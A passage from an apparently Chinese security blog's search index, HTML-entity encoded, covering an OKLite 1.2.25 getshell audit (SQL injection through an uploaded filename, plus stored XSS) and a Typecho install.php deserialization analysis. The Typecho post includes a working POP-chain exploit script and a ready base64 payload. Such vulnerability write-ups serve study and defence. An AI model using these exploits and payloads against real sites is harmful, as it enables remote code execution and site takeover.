&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#x4EE5;php&#x7ED3;&#x5C3E;&#x63D2;&#x5165;&#x5230;&#x6570;&#x636E;&#x5E93;&#x5F53;&#x4E2D;&#xFF0C;&#x5F53;&#x5229;&#x7528;replace_f&#x65B9;&#x6CD5;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6076;&#x610F;php&#x4EE3;&#x7801;&#x7684;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x5199;&#x5165;&#x4E00;&#x4E2A;.php&#x540E;&#x7F00;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x5BFC;&#x81F4;getshell&#x3002; &#x6587;&#x4EF6;&#x4FE1;&#x606F;&#x5728;&#x6570;&#x636E;&#x5E93;&#x5F53;&#x4E2D;&#xFF1A; &#x4E8E;&#x662F;&#x6784;&#x9020;&#x6587;&#x4EF6;&#x540D;&#x4E3A;&#xFF1A; 1&apos;,&apos;pf3qm0js3gb2s5f33r7lf14vl3&apos;,&apos;30&apos;),(&apos;1&apos;,&apos;res/201910/05/&apos;,&apos;shell.jpg&apos;,&apos;jpg&apos;,&apos;res/201910/05/shell.php&apos;,&apos;1570161575&apos;,&apos;abc &#x7531;&#x4E8E;&#x6587;&#x4EF6;&#x540D;&#x65E0;&#x6CD5;&#x5305;&#x542B;/&#xFF0C;&#x6240;&#x4EE5;&#x628A;&#x5305;&#x542B;/&#x7684;&#x90E8;&#x5206;&#x8F6C;&#x6362;&#x4E3A;16&#x8FDB;&#x5236;(&#x524D;&#x9762;&#x52A0;0x)&#xFF1A; 1&apos;,&apos;pf3qm0js3gb2s5f33r7lf14vl3&apos;,&apos;30&apos;),(&apos;1&apos;,0x7265732f3230313931302f30352f,&apos;shell.jpg&apos;,&apos;jpg&apos;, 0x7265732f3230313931302f30352f7368656c6c2e706870,&apos;1570161575&apos;,&apos;abc &#x4E0A;&#x4F20;&#x540E;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#xFF1A; &#x7531;&#x4E8E;&#x4E0A;&#x4F20;&#x540E;&#x8FD4;&#x56DE;&#x7684;&#x56FE;&#x7247;&#x7684;id&#x662F;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#xFF0C;&#x9700;&#x8981;&#x628A;id+1&#x518D;&#x8D4B;&#x503C;&#x5230;replace&#x4E2D;&#x7684;oldid&#x4E2D;&#x3002; &#x4E0A;&#x4F20;&#x65F6;&#x8C03;&#x7528;Replace_f&#x7684;&#x5730;&#x5740;&#xFF1A; http://localhost/index.php?c=upload&amp;f=replace&amp;oldid=1 &#x5C06;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x6539;&#x4E3A;php&#x4EE3;&#x7801;&#x4E0A;&#x4F20;&#x5373;&#x53EF;&#x3002; PS&#xFF1A;&#x8FD9;&#x91CC;&#x9664;&#x4E86;&#x914D;&#x5408;replace_f&#x4E4B;&#x5916;&#xFF0C;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x7684;&#x4FE1;&#x606F;&#x4E5F;&#x53EF;&#x5BFC;&#x81F4;&#x540E;&#x53F0;&#x7684;&#x50A8;&#x5B58;&#x578B;XSS&#x3002; &#x603B;&#x7ED3;&#x5F53;GET,POST,COOKIE&#x90FD;&#x8FDB;&#x884C;&#x4E86;&#x4E25;&#x683C;&#x7684;&#x8FC7;&#x6EE4;&#x65F6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5BFB;&#x627E;&#x4E00;&#x4E9B;&#x4E0D;&#x662F;&#x5F88;&#x5E38;&#x89C4;&#x7684;&#x8F93;&#x5165;&#x70B9;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#xFF0C;&#x5982;&#x8FD9;&#x91CC;&#x7684;zip&#x89E3;&#x538B;&#x7F29;&#xFF0C;&#x63D2;&#x5165;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x7B49;&#x7B49;&#x3002; &#x672C;&#x60F3;&#x627E;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x7CFB;&#x7EDF;&#x8FDB;&#x884C;&#x5BA1;&#x8BA1;&#x5B66;&#x4E60;&#x7684;&#xFF0C;&#x6CA1;&#x60F3;&#x5230;&#x8FD9;&#x4E2A;&#x7CFB;&#x7EDF;&#x8FC7;&#x6EE4;&#x6709;&#x70B9;&#x4E25;&#x683C;&#x3002;&#x8FDE;&#x76F4;&#x63A5;&#x83B7;&#x53D6;get&#x53C2;&#x6570;&#x90FD;&#x6CA1;&#x51E0;&#x5904;&#x3002;&#x82B1;&#x4E86;&#x5F88;&#x591A;&#x65F6;&#x95F4;&#xFF0C;&#x6700;&#x540E;&#x627E;&#x539F;&#x6765;&#x7684;&#x6848;&#x4F8B;&#x624D;&#x53D1;&#x73B0;&#xFF0C;&#x5F88;&#x591A;&#x6F0F;&#x6D1E;&#x90FD;&#x6CA1;&#x6709;&#x88AB;&#x4FEE;&#x590D;&#x3002;&#x4E8E;&#x662F;&#xFF0C;&#x8BF4;&#x597D;&#x7684;&#x5BA1;&#x8BA1;&#x53D8;&#x6210;&#x590D;&#x73B0;&#x4E86;&#xFF1F;","link":"/2019/10/07/OKLite 1.2.25 几处getshell审计分析/"},{"title":"Typecho 反序列化漏洞分析","text":"&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#xFF1A;&#x601D;&#x8DEF; &#x5728;Typecho_Cookie::get()&#x65B9;&#x6CD5;&#x4E2D;&#x901A;&#x8FC7;POST&#x6216;&#x8005;&#x8BBE;&#x7F6E;COOKIE&#x7684;&#x65B9;&#x6CD5;&#x8BBE;&#x7F6E;_typecho_config&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002; &#x5728;&#x5E8F;&#x5217;&#x5316;&#x5F53;&#x4E2D;&#x628A;adapter&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x7C7B;&#xFF0C;&#x5BFC;&#x81F4;&#x9875;&#x9762;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x65F6;&#x89E6;&#x53D1;_toString()&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002; &#x5728;&#x5E8F;&#x5217;&#x5316;&#x5F53;&#x4E2D;&#x8BBE;&#x7F6E;$item&#x4EE4;&#x5176;&#x6CA1;&#x6709;screenName&#x5C5E;&#x6027;&#xFF0C;&#x5BFC;&#x81F4;&#x5728;&#x89E6;&#x53D1;_toString()&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#x89E6;&#x53D1;_get()&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002; &#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x95F4;&#x63A5;&#x63A7;&#x5236;$this-&gt;_filter&#x7684;&#x503C;&#xFF0C;&#x5229;&#x7528;array_map(),call_user_func()&#x6267;&#x884C;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x3002; &#x53EF;&#x77E5;&#xFF0C;&#x5728;&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6700;&#x7EC8;&#x662F;&#x8981;&#x5229;&#x7528;_toString(),_get()&#x7B49;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x6784;&#x9020;&#x4E00;&#x4E2A;POC&#x94FE;&#xFF0C;&#x6700;&#x7EC8;&#x6267;&#x884C;&#x6076;&#x610F;&#x4EE3;&#x7801; PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x53EF;&#x5229;&#x7528;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;- __wakeup() //&#x4F7F;&#x7528;unserialize&#x65F6;&#x89E6;&#x53D1; - __sleep() //&#x4F7F;&#x7528;serialize&#x65F6;&#x89E6;&#x53D1; - __destruct() //&#x5BF9;&#x8C61;&#x88AB;&#x9500;&#x6BC1;&#x65F6;&#x89E6;&#x53D1; - __call() //&#x5728;&#x5BF9;&#x8C61;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x89E6;&#x53D1; - __callStatic() //&#x5728;&#x9759;&#x6001;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x89E6;&#x53D1; - __get() //&#x7528;&#x4E8E;&#x4ECE;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x8BFB;&#x53D6;&#x6570;&#x636E; - __set() //&#x7528;&#x4E8E;&#x5C06;&#x6570;&#x636E;&#x5199;&#x5165;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027; - __isset() //&#x5728;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x4E0A;&#x8C03;&#x7528;isset()&#x6216;empty()&#x89E6;&#x53D1; - __unset() //&#x5728;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x4E0A;&#x4F7F;&#x7528;unset()&#x65F6;&#x89E6;&#x53D1; - __toString() //&#x628A;&#x7C7B;&#x5F53;&#x4F5C;&#x5B57;&#x7B26;&#x4E32;&#x4F7F;&#x7528;&#x65F6;&#x89E6;&#x53D1; - __invoke() //&#x5F53;&#x811A;&#x672C;&#x5C1D;&#x8BD5;&#x5C06;&#x5BF9;&#x8C61;&#x8C03;&#x7528;&#x4E3A;&#x51FD;&#x6570;&#x65F6;&#x89E6;&#x53D1; &#x6F0F;&#x6D1E;&#x7684;&#x5165;&#x53E3;&#x70B9;&#x5728;install.php&#xFF0C;&#x8FDB;&#x5165;install.php&#x9996;&#x5148;&#x7ECF;&#x8FC7;&#x4E24;&#x4E2A;&#x5224;&#x65AD;&#xFF01; 12345678910111213141516171819202122&lt;?php//&#x5224;&#x65AD;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;if (!isset($_GET[&apos;finish&apos;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &apos;/config.inc.php&apos;) &amp;&amp; empty($_SESSION[&apos;typecho&apos;])) { exit;}// &#x6321;&#x6389;&#x53EF;&#x80FD;&#x7684;&#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;if (!empty($_GET) || !empty($_POST)) { if (empty($_SERVER[&apos;HTTP_REFERER&apos;])) { exit; } $parts = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]); if (!empty($parts[&apos;port&apos;]) &amp;&amp; $parts[&apos;port&apos;] != 80) { $parts[&apos;host&apos;] = &quot;{$parts[&apos;host&apos;]}:{$parts[&apos;port&apos;]}&quot;; } if (empty($parts[&apos;host&apos;]) || $_SERVER[&apos;HTTP_HOST&apos;] != $parts[&apos;host&apos;]) { exit; }}?&gt; &#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x4E3A;&#xFF1A; GET&#x4E2D;&#x7684;finishi&#x53C2;&#x6570;&#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&#x3002; referer&#x4E3A;&#x7AD9;&#x5185;url &#x5206;&#x6790;&#x8FC7;&#x7A0B;&#xFF1A;1234567&lt;?php$config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));Typecho_Cookie::delete(&apos;__typecho_config&apos;);$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);Typecho_Db::set($db);?&gt; &#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x51FD;&#x6570;&#xFF1A;unserialize() &#x5176;&#x4E2D;&#x662F;&#x901A;&#x8FC7;Typecho_Cookie::get()&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x7F51;&#x9875;&#xFF0C;&#x4E3A;www\\var\\Typecho\\Cookie.php 12345678&lt;?phppublic static function get($key, $default = NULL){ $key = self::$_prefix . $key; $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default); return is_array($value) ? $default : $value;}?&gt; &#x4ECE;&#x7B2C;&#x56DB;&#x884C;&#x547D;&#x4EE4;&#x53EF;&#x77E5;&#xFF0C;typecho_config&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;COOKIE&#x7684;&#x65B9;&#x5F0F;&#x6216;&#x8005;POST&#x7684;&#x65B9;&#x5F0F;&#x8F93;&#x5165;&#xFF01; &#x518D;&#x7EE7;&#x7EED;&#x770B;&#x524D;&#x9762;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x7B2C;&#x56DB;&#x884C;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x53D8;&#x91CF;&#xFF01; 123&lt;?php $db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);?&gt; &#x53EF;&#x77E5;&#xFF0C;&#x8FD9;&#x91CC;&#x5B9E;&#x4F8B;&#x5316;&#x4E86;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61; Typecho_Db &#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;&#x6240;&#x5728;&#x7684;&#x9875;&#x9762;&#x4E0E;&#x4EE3;&#x7801;&#xFF01;&#x4E3A;www\\var\\Typecho\\Db.php &#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x4E2A;Typecho_Db&#x7C7B;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF1A; 123456789101112131415161718192021222324&lt;?php public function __construct($adapterName, $prefix = &apos;typecho_&apos;) { /** &#x83B7;&#x53D6;&#x9002;&#x914D;&#x5668;&#x540D;&#x79F0; */ $this-&gt;_adapterName = $adapterName; /** &#x6570;&#x636E;&#x5E93;&#x9002;&#x914D;&#x5668; */ $adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName; if (!call_user_func(array($adapterName, &apos;isAvailable&apos;))) { throw new Typecho_Db_Exception(&quot;Adapter {$adapterName} is not available&quot;); } $this-&gt;_prefix = $prefix; /** &#x521D;&#x59CB;&#x5316;&#x5185;&#x90E8;&#x53D8;&#x91CF; */ $this-&gt;_pool = array(); $this-&gt;_connectedPool = array(); $this-&gt;_config = array(); //&#x5B9E;&#x4F8B;&#x5316;&#x9002;&#x914D;&#x5668;&#x5BF9;&#x8C61; $this-&gt;_adapter = new $adapterName(); }?&gt; &#x4ECE;&#x4EE3;&#x7801;&#x53EF;&#x77E5;&#xFF0C;$adapterName = &#x2018;Typecho_Db_Adapter_&#x2019; . $adapterName; &#x4F1A;&#x5C06;$config[&#x2018;adapter&#x2019;]&#x6240;&#x8D4B;&#x503C;&#x7684;$adapterName&#x4E0E;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x76F8;&#x52A0;&#xFF01; &#x5982;&#x679C;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x5C06;adapter&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x7C7B;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x5C31;&#x4F1A;&#x89E6;&#x53D1;__toString()&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF01; &#x7528;&#x5168;&#x5C40;&#x641C;&#x7D22;&#x641C;&#x7D22;&#x6240;&#x6709;&#x53EF;&#x5229;&#x7528;__toString()&#x65B9;&#x6CD5;&#x7684;&#x5730;&#x65B9;&#xFF01; &#x5B58;&#x5728;&#x4E8E;&#xFF1A;www\\var\\Typecho\\Feed.php &#x5728;__toString()&#x7C7B;&#x4E0B;&#xFF0C;&#x5B58;&#x5728;&#x8FD9;&#x4E00;&#x6BB5;&#x4EE3;&#x7801;&#xFF01; 1234567891011&lt;?php foreach ($this-&gt;_items as $item) { $content .= &apos;&lt;item&gt;&apos; . self::EOL; $content .= &apos;&lt;title&gt;&apos; . htmlspecialchars($item[&apos;title&apos;]) . &apos;&lt;/title&gt;&apos; . self::EOL; $content .= &apos;&lt;link&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/link&gt;&apos; . self::EOL; $content .= &apos;&lt;guid&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/guid&gt;&apos; . self::EOL; $content .= &apos;&lt;pubDate&gt;&apos; . $this-&gt;dateFormat($item[&apos;date&apos;]) . &apos;&lt;/pubDate&gt;&apos; . self::EOL; $content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL; .... }?&gt; &#x9875;&#x9762;&#x4E4B;&#x524D;&#x7684;&#x4EE3;&#x7801;&#xFF1A; 12345678&lt;?php private $_items = array(); .... public function addItem(array $item) { $this-&gt;_items[] = $item; }?&gt; &#x7531;&#x4E0A;&#x4E0A;&#x65B9;&#x7684;&#x4EE3;&#x7801;&#x6B64;&#x9875;&#x9762;&#x524D;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x53EF;&#x77E5;&#xFF0C; $this-&gt;items&#x662F;Typecho_Feed&#x662F;&#x7684;&#x4E00;&#x4E2A;&#x79C1;&#x6709;&#x5C5E;&#x6027;&#x3002;&#xFF08;&#x5E76;&#x4E14;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#xFF09;$item&#x662F;&#x7531;$this-&gt;items foreach&#x51FA;&#x6765;&#x7684;&#x3002; &#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#xFF0C;&#x6267;&#x884C;&#x4E86;$item[&#x2018;author&#x2019;]-&gt;screenName&#x3002;&#x901A;&#x8FC7;$item[&#x2018;author&#x2019;]&#x8C03;&#x7528;&#x4E86;screenName&#x5C5E;&#x6027;&#x3002; &#x5982;&#x679C;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5C06;$item[&#x2018;author&#x2019;]&#x8BBE;&#x7F6E;&#x4E3A;&#x6CA1;&#x6709;screenName&#x5C5E;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x6267;&#x884C;$item[&#x2018;author&#x2019;]-&gt;screenName&#x4EE3;&#x7801;&#x65F6;&#x5C31;&#x4F1A;&#x81EA;&#x52A8;&#x8C03;&#x7528;_get()&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002; &#x518D;&#x7528;&#x5168;&#x5C40;&#x641C;&#x7D22;&#x7684;&#x65B9;&#x6CD5;&#x641C;&#x7D22;_get() &#x5B58;&#x5728;&#x4E8E;&#xFF1A;www\\var\\Typecho\\Request.php 12345678&lt;?php ... public function __get($key) { return $this-&gt;get($key); } ...?&gt; &#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x4E86;get&#x65B9;&#x6CD5;&#xFF0C;&#x7EE7;&#x7EED;&#x67E5;&#x627E;&#xFF1A; 12345678910111213141516171819&lt;?php public function get($key, $default = NULL) { switch (true) { case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset(self::$_httpParams[$key]): $value = self::$_httpParams[$key]; break; default: $value = $default; break; } $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_applyFilter($value); }?&gt; &#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;$value = $this-&gt;_params[$key];&#x53EF;&#x77E5;&#xFF0C;value&#x53D8;&#x91CF;&#x7684;&#x503C;&#x7531;$this-&gt;_params&#x63D0;&#x4F9B;&#xFF0C;&#x5728;&#x6700;&#x540E;&#x53C8;&#x6267;&#x884C;&#x4E86;$this-&gt;_applyFilter($value); &#x7EE7;&#x7EED;&#x67E5;&#x627E;applyFilter()&#x65B9;&#x6CD5;&#x3002; 123456789101112131415&lt;?php private function _applyFilter($value) { if ($this-&gt;_filter) { foreach ($this-&gt;_filter as $filter) { $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); } $this-&gt;_filter = array(); } return $value; }?&gt; &#x5728;&#x8FD9;&#x91CC;&#x5B58;&#x5728;&#x4E24;&#x4E2A;&#x53CD;&#x8C03;&#x51FD;&#x6570;&#xFF1A;&#x5206;&#x522B;&#x4E3A;&#xFF1A;array_map(),call_user_func(). call_user_func()&#xFF08;&#x628A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4F5C;&#x4E3A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x8C03;&#x7528;&#xFF09; array_map()&#xFF08;&#x51FD;&#x6570;&#x5C06;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x5230;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x503C;&#x4E0A;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x540E;&#x7684;&#x5E26;&#x6709;&#x65B0;&#x503C;&#x7684;&#x6570;&#x7EC4;&#x3002;&#xFF09; &#x8FD9;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x90FD;&#x662F;&#x4F5C;&#x4E3A;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x5E76;&#x4E14;$filter&#x4E0E;$value&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x95F4;&#x63A5;&#x63A7;&#x5236;&#x3002; &#x9644;&#x4E0A;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;EXP&#xFF1A;&lt;?php class Typecho_Request { private $_params = array(); private $_filter = array(); public function __construct() { // $this-&gt;_params[&apos;screenName&apos;] = &apos;whoami&apos;; $this-&gt;_params[&apos;screenName&apos;] = -1; $this-&gt;_filter[0] = &apos;phpinfo&apos;; } } class Typecho_Feed { const RSS2 = &apos;RSS 2.0&apos;; /** &#x5B9A;&#x4E49;ATOM 1.0&#x7C7B;&#x578B; */ const ATOM1 = &apos;ATOM 1.0&apos;; /** &#x5B9A;&#x4E49;RSS&#x65F6;&#x95F4;&#x683C;&#x5F0F; */ const DATE_RFC822 = &apos;r&apos;; /** &#x5B9A;&#x4E49;ATOM&#x65F6;&#x95F4;&#x683C;&#x5F0F; */ const DATE_W3CDTF = &apos;c&apos;; /** &#x5B9A;&#x4E49;&#x884C;&#x7ED3;&#x675F;&#x7B26; */ const EOL = &quot;\\n&quot;; private $_type; private $_items = array(); public $dateFormat; public function __construct() { $this-&gt;_type = self::RSS2; $item[&apos;link&apos;] = &apos;1&apos;; $item[&apos;title&apos;] = &apos;2&apos;; $item[&apos;date&apos;] = 1507720298; $item[&apos;author&apos;] = new Typecho_Request(); $item[&apos;category&apos;] = array(new Typecho_Request()); $this-&gt;_items[0] = $item; } } $x = new Typecho_Feed(); $a = array( &apos;host&apos; =&gt; &apos;localhost&apos;, &apos;user&apos; =&gt; &apos;xxxxxx&apos;, &apos;charset&apos; =&gt; &apos;utf8&apos;, &apos;port&apos; =&gt; &apos;3306&apos;, &apos;database&apos; =&gt; &apos;typecho&apos;, &apos;adapter&apos; =&gt; $x, &apos;prefix&apos; =&gt; &apos;typecho_&apos; ); echo urlencode(base64_encode(serialize($a))); ?&gt; &#x751F;&#x6210;&#x7684;payload&#x4E3A;&#xFF1A;YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9 EXP&#x5206;&#x6790;&#x4E0A;&#x9762;&#x7684;exp&#x662F;&#x4E00;&#x4E2A;&#x5927;&#x795E;&#x5199;&#x7684;&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x5206;&#x6790;&#x662F;&#x57FA;&#x4E8E;&#x5B83;&#x7684;exp&#x7136;&#x540E;&#x5220;&#x51CF;&#x4E86;&#x4E00;&#x4E9B;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x7684;&#x3002; &#x53EA;&#x4F5C;&#x7B80;&#x5355;&#x7684;&#x5206;&#x6790;&#x3002; 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass Typecho_Request{ private $_params = array(); //&#x8981;&#x95F4;&#x63A5;&#x63A7;&#x5236;_filter[0]&#x7684;&#x503C;&#xFF0C;&#x9700;&#x8981;&#x5B9A;&#x4E49;&#x8FD9;&#x4E24;&#x4E2A;&#x6570;&#x7EC4;&#xFF01; private $_filter = array(); public function __construct(){ $this-&gt;_params[&apos;screenName&apos;] = 1; //&#x4F1A;&#x5224;&#x65AD;&#x4ED6;&#x662F;&#x5426;&#x88AB;&#x5B9A;&#x4E49;&#xFF0C;&#x5982;&#x679C;&#x8D4B;&#x4E88;0&#xFF0C;&#x5219;&#x4F1A;&#x51FA;&#x9519;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;&#x503C;&#x53EA;&#x8981;&#x4E0D;&#x4E3A;0&#x90FD;&#x884C;&#xFF01; //&#x8FD9;&#x91CC;&#x7684;&#x6570;&#x7EC4;&#x7D22;&#x5F15;&#x5FC5;&#x987B;&#x662F;screenName&#xFF0C;&#x56E0;&#x4E3A;&#x89E6;&#x53D1;__get()&#x65B9;&#x6CD5;&#x662F;&#x7531;&#x4E8E;&#x8C03;&#x7528;&#x4E86;screenName&#x5C5E;&#x6027;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;screenName&#x6B63;&#x662F;&#x8C03;&#x7528;&#x5C5E;&#x6027;&#x65F6;&#x5019;&#x8D4B;&#x4E88;&#x7ED9;get()&#x7684;&#x503C;&#x5373;$key&#x7684;&#x503C; $this-&gt;_filter[0] = &apos;echo &quot;fuckkkkkk!!!&quot;&apos;; //&#x6709;&#x4E00;&#x4E2A;foreach&#x547D;&#x4EE4;&#xFF0C;&#x4F1A;&#x5C06;$this-&gt;_filter[0]&#x8FDB;&#x884C;call_user_func(),&#x5E76;&#x5C06;&#x503C;&#x4F5C;&#x4E3A;&#x51FD;&#x6570;&#x8FD0;&#x884C;&#x3002;&#x5373;&#x5229;&#x7528;&#x4EE3;&#x7801;&#xFF01; }}class Typecho_Feed{ /** &#x5B9A;&#x4E49;RSS 2.0&#x7C7B;&#x578B; */ const RSS2 = &apos;RSS 2.0&apos;; //&#x9875;&#x9762;&#x91CC;&#x9762;&#x6709;&#x4E2A;if&#x547D;&#x4EE4;&#xFF0C;&#x540E;&#x9762;&#x7684;$this-&gt;_type&#x9700;&#x8981;&#x548C;&#x8FD9;&#x4E2A;&#x76F8;&#x7B49;&#xFF0C;&#x624D;&#x80FD;&#x6267;&#x884C;&#x5230;&#x8C03;&#x7528;screenName&#x7684;&#x5730;&#x65B9;&#xFF01; private $_type; private $_items = array(); public function __construct(){ $this-&gt;_type = self::RSS2; 